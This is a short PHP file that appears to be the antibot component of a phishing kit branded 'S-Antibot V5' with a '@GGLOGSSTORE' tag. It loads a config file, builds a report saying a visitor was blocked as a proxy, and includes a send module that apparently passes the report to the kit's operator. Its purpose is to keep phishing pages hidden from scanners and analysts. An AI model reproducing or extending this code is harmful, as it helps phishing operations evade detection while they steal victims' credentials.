<?php
$tanitatikaram = parse_ini_file("../Anticonfig.ini", true);
require_once('Module/Setmodule.php');
$body.= "Zdravstvuyte Author:  $zo  \n\n";
$body.= " @GGLOGSSTORE | S-Antibot V5 | REASON : proxy"."\n";
require_once('Module/Sendmodule.php');
?>